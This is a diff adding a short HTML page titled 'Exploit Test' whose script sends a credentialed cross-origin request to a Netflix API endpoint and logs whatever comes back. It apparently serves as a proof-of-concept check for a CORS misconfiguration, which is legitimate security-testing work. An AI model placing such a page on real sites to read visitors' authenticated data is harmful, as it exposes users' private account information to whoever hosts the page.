@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Exploit Test</title>
+  </head>
+  <body>
+    <script>
+      fetch("http://api.netflix.com/sensitive-endpoint", {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(response => response.text())
+      .then(data => console.log("API Response:", data))
+      .catch(err => console.error("Error:", err));
+    </script>
+  </body>
+</html>
